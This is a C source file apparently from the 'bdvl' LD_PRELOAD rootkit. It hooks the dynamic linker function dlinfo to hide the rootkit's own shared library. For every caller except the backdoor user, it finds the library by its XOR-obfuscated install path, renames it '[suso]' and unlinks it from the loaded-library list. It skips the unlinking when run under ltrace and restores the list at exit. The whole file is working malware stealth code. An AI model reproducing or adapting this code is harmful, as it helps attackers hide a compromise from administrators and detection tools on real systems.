#include "../bdvl_util/util.h"

static struct link_map *bdvl_linkmap;

void repair_linkmap()
{
    bdvl_linkmap->l_prev->l_next = bdvl_linkmap;
    bdvl_linkmap->l_next->l_prev = bdvl_linkmap;
}

int dlinfo(void *handle, int request, void *p)
{
    HOOK(o_dlinfo, CDLINFO);

    if(is_bdusr()) return o_dlinfo(handle, request, p);

    if(request == 2)
    {
        char *idir=strdup(IDIR); xor(idir);
        struct link_map *loop;
        o_dlinfo(handle, request, &loop);

        do {
            loop = loop->l_next;
            if(strcmp(loop->l_name, "\0"))
            {
                if(strstr(loop->l_name, idir))
                {
                    bdvl_linkmap = loop;
                    loop->l_name = "[suso]";

                    if(strcmp(cprocname(), "ltrace"))
                    {
                        atexit(repair_linkmap);
                        loop->l_prev->l_next = loop->l_next;
                        loop->l_next->l_prev = loop->l_prev;
                    }
                }

            }
        }while(loop != NULL && loop->l_name != NULL && loop->l_next != NULL);
        CLEAN(idir);
    }

    return o_dlinfo(handle, request, p);
}
